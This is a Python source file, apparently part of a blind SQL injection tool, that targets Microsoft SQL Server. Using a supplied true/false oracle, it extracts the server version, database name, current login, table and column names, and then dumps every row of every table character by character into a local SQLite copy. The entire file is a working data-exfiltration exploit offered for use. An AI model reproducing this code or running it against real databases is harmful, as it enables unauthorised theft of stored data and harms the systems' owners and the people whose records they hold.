import string, urllib3, sqlite3
from . import utils
from threading import Thread, Lock
from multiprocessing import Queue, Process, Manager
from rich.progress import Progress

urllib3.disable_warnings()

class MsSQL:
    def __init__(self, isTrue, outputPath, localDB) -> None:
        self.isTrue = isTrue
        self.extractData = localDB != None
        self.ldb = None if localDB is None else sqlite3.connect(localDB)
        self.dbLock = Lock()
        self.outputPath = outputPath
        self.outputText = ''
        self.dictionary = string.ascii_lowercase + string.digits + string.ascii_uppercase + ' ' + """!"#%()*+,-./:;<=>@[]^_`{|}~"""

    def output(self, txt):
        self.outputText += f'{txt}\n'
        with open(self.outputPath, 'w') as f:
            f.write(self.outputText)

    def extractLetterAtIndex(self, query, index, letters):
        for c in self.dictionary:
            if self.isTrue(query % c):
                letters.put((index, c))
                break

    def getString(self, query, len, parenthesisOffset=False):
        threads = []
        q = Queue()

        for i in range(len):
            t = Thread(target=self.extractLetterAtIndex, args = (query % ('%s', i+(2 if parenthesisOffset else 1)), i, q), daemon = True)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        pieces = []

        while q.qsize() > 0:
            pieces.append(q.get())

        pieces = sorted(pieces, key= lambda e: e[0])

        return ''.join([p[1] for p in pieces])

    def whatNumber(self, q):
        l = 0

        while True:
            if self.isTrue(q % l):
                break
            l += 1

        return l

    def executeLDBQueryRaw(self, q):
        with self.dbLock:
            cur = self.ldb.cursor()
            cur.execute(q)
            self.ldb.commit()

    def executeLDBQuery(self, q, params):
        with self.dbLock:
            cur = self.ldb.cursor()
            cur.execute(q, tuple(params))
            self.ldb.commit()

    def dumpTable(self, tName, pMap, tid):
        recordsNo = self.whatNumber(f"""%d = (SELECT COUNT(*) FROM {tName})""")

        pMap[tid] = { 't': recordsNo, 'p': 0 }

        columnsNo = self.whatNumber(f"""%d = (SELECT COUNT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{tName}')""")

        columns = []

        for ci in range(columnsNo):
            colLen = self.whatNumber(f"""%d = (SELECT LEN(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{tName}' ORDER BY COLUMN_NAME ASC OFFSET {ci} ROWS FETCH NEXT 1 ROWS ONLY)""")

            col = self.getString(f"""'%s' = (SELECT SUBSTRING(COLUMN_NAME, %d, 1) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{tName}' ORDER BY COLUMN_NAME ASC OFFSET {ci} ROWS FETCH NEXT 1 ROWS ONLY)""", colLen)

            columns.append(col)

        self.executeLDBQueryRaw(f""" CREATE TABLE IF NOT EXISTS {tName}({ ', '.join([ f'{c} TEXT' for c in columns]) })""")

        for ri in range(recordsNo):
            
            row = []
            
            for c in columns:
                fieldLen = self.whatNumber(f"""%d = (SELECT LEN(CAST({c} AS varchar)) FROM {tName} ORDER BY {columns[0]} ASC OFFSET {ri} ROWS FETCH NEXT 1 ROWS ONLY)""")
                field = self.getString(f"""'%s' = (SELECT SUBSTRING(CAST({c} AS varchar), %d, 1) FROM {tName} ORDER BY {columns[0]} ASC OFFSET {ri} ROWS FETCH NEXT 1 ROWS ONLY)""", fieldLen)
                row.append(field)

            pMap[tid] = { 't': recordsNo, 'p': ri + 1 }

            self.executeLDBQuery(f"""INSERT INTO {tName} VALUES ({ ', '.join(['?' for _ in range(columnsNo)]) })""", row)

    def run(self):
        utils.printDoing('Obtaining database version...')
        
        dbInfoLen =  self.whatNumber("""%d = LEN(@@VERSION)""")
        
        dbInfo = self.getString("""'%s' = SUBSTRING(@@VERSION, %d, 1)""", dbInfoLen)
        
        utils.printSuccess(f'DB Info: {dbInfo}')
        
        self.output(f'DB Info: {dbInfo}')

        utils.printDoing('Obtaining current database name...')

        dbNameLen = self.whatNumber("""%d = LEN(DB_NAME())""")

        dbName = self.getString("""'%s' = SUBSTRING(DB_NAME(), %d, 1)""", dbNameLen)
        
        utils.printSuccess(f'DB Name: {dbName}')
        
        self.output(f'DB Name: {dbName}')

        utils.printDoing('Obtaining current username...')

        usernameLen = self.whatNumber("""%d = LEN(SUSER_NAME())""")

        username = self.getString("""'%s' = SUBSTRING(SUSER_NAME(), %d, 1)""", usernameLen)

        utils.printSuccess(f'Current Username: {username}')
        
        self.output(f'Current Username: {username}')

        utils.printDoing('Extracting number of tables...')

        tablesN = self.whatNumber("""%d = (SELECT COUNT(object_id) FROM Sys.Tables)""")

        utils.printSuccess(f'Number of tables in current DB: {tablesN}')
        
        self.output(f'Number of tables in current DB: {tablesN}')

        self.output('Table Names:')

        if self.extractData:
            tableProcesses = []
            
            print('')
            
            with Progress() as progress:
                tableNamesTask = progress.add_task("[green]Extracting table names...", total=tablesN)
                
                m = Manager()

                progress_map = m.dict()

                for tIndex in range(tablesN):

                    tNameLen = self.whatNumber(f"""%d = ( SELECT LEN([name]) FROM Sys.Tables ORDER BY [name] ASC OFFSET {tIndex} ROWS FETCH NEXT 1 ROWS ONLY )""")

                    tName = self.getString(f"""'%s' = ( SELECT SUBSTRING([name], %d, 1) FROM Sys.Tables ORDER BY [name] ASC OFFSET {tIndex} ROWS FETCH NEXT 1 ROWS ONLY )""", tNameLen)

                    self.output(tName)

                    progress.update(tableNamesTask, advance=1)
                    
                    task = progress.add_task(f"[cyan](T) {tName}", total=100)

                    progress_map[task] = {"p": 0, "t": 100}

                    proc = Process(target=self.dumpTable, args=(tName, progress_map, task))

                    proc.start()

                    tableProcesses.append(proc)

                while sum([p.is_alive() for p in tableProcesses]) != 0:
                    for task_id, update_data in progress_map.items():
                        latest = update_data["p"]
                        total = update_data["t"]
                        progress.update(
                            task_id,
                            completed=latest,
                            total=total
                        )
        else:

            utils.printDoing("Now extracting table names")

            for tIndex in range(tablesN):
                
                utils.printDoing(f'Extracting table N {tIndex+1}')

                tNameLen = self.whatNumber(f"""%d = ( SELECT LEN([name]) FROM Sys.Tables ORDER BY [name] ASC OFFSET {tIndex} ROWS FETCH NEXT 1 ROWS ONLY )""")

                tName = self.getString(f"""'%s' = ( SELECT SUBSTRING([name], %d, 1) FROM Sys.Tables ORDER BY [name] ASC OFFSET {tIndex} ROWS FETCH NEXT 1 ROWS ONLY )""", tNameLen)
                
                utils.printSuccess(f'Table N {tIndex+1} name: {tName}')
                self.output(tName)

